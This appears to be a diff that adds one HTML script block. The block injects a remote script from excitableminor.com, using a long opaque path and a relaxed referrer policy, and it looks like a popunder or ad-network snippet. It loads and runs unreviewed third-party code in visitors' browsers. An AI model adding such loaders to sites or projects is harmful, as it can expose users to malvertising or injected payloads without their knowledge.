@@ -1,0 +1,12 @@
+<script>
+(function(zpjo){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = zpjo || {};
+s.src = "\/\/excitableminor.com\/bNX.Vqsxd\/Gjlk0BYsW\/ch\/GeDm\/9GusZmUElOkEPQTVY\/3mMaTyYS5VOlTDUDtkNzjPc\/xtNHjIkD5KNBgZ";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
